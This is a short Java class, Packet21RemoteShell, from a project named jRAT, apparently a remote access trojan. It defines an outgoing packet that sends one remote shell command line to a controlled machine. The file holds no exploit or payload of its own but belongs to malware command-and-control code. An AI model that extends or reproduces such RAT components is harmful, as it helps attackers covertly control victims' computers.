package jrat.client.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet21RemoteShell extends AbstractOutgoingPacket {

	private String line;

	public Packet21RemoteShell(String line) {
		this.line = line;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(this.line);
	}

	@Override
	public short getPacketId() {
		return 21;
	}

}
